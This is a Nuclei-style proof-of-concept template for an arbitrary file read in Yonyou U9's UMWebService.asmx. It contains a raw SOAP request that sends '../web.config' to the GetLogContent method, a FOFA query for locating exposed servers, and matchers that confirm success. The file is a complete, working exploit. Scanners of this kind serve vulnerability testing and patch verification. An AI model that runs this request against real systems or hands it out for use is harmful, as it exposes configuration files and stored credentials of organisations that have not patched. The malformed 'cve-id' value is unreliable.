poc_all/other/TVE-2024-105141328.yaml

id: 2024-105141328

info:
  name: 用友U9-UMWebService.asmx存在任意文件读取漏洞
  author: k3ppf0r
  severity: high
  description: |  
    用友U9多组织企业互联网应用平台UMWebService.asmx存在任意文件读取漏洞。攻击者可以通过发送特定的请求，利用该漏洞获取系统敏感文件。
  reference:
    - https://cn-sec.com/archives/2537731.html
  remediation: |
    升级官方补丁, 重启服务
  classification:
    cve-id: 2024-105141328
    cvss-score: 7.1
    cwe-id: CWE-200
  metadata:
    date: 2024-03-01
    version: | 
      用友U9
    fofa-query: body="logo-u9.png"
  tags: yonyou,lfi,leak,u9

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.ashx"

http:
  - raw:
      - |
        @timeout: 10s
        POST /u9/OnLine/UMWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36
        Connection: close
        Content-Length: 381
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetLogContent"
        Accept-Encoding: gzip

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetLogContent xmlns="http://tempuri.org/">
              <fileName>../web.config</fileName>
            </GetLogContent>
          </soap:Body>
        </soap:Envelope>

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "version=")'
        condition: and